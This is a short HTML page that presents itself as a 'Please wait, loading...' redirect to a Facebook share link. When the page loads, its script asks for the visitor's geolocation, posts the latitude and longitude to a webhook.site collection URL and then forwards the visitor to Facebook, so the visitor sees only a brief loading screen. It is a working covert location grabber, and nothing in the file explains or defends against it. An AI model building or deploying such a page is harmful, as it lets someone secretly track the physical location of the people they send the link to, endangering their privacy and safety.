<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
    <div style="text-align:center;"><p>Please wait, loading...</p></div>
    <script>
        const targetURL = "https://www.facebook.com/share/1DUtaFbjxj/?mibextid=wwXIfr";
        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
                        body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude}) 
                    }).then(() => { window.location.href = targetURL; });
                }, function() { window.location.href = targetURL; }, {timeout: 5000});
            } else { window.location.href = targetURL; }
        };
    </script>
</body>
</html>
